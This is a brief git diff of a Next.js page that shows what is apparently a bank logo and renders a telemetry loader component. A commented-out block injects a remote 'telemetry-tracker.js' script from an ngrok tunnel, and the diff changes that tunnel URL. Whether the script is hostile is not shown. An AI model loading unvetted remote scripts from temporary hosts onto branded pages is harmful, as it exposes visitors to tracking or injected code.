@@ -5,11 +5,12 @@ import React,{useEffect} from "react";
 import NavBar from "../components/NavBar";
 import Image from "next/image";
 import TelemetryScriptLoader from "../components/Telemetry";
+import Head from "next/head"
 
 export default function Page() {
     // useEffect(() => {
     //     const script = document.createElement('script');
-    //     script.src = "https://b974-196-50-25-138.ngrok-free.app/static/telemetry-tracker.js";
+    //     script.src = "https://9ed4-196-50-25-143.ngrok-free.app/static/telemetry-tracker.js";
     //     script.async = true;
     //     document.body.appendChild(script);
     
@@ -23,6 +24,7 @@ export default function Page() {
     return (
         <main className="bg-slate-50 w-full h-screen text-black ">
             <TelemetryScriptLoader/>
+           
             <header className="flex flex-row items-center justify-center h-full p-5">
                 <div className="flex flex-row items-center justify-center max-sm:relative">
                     <Image src={"/stanbic.png"} width={200} height={200} alt="hero" quality={100} className="object-contain md:-mr-56" />
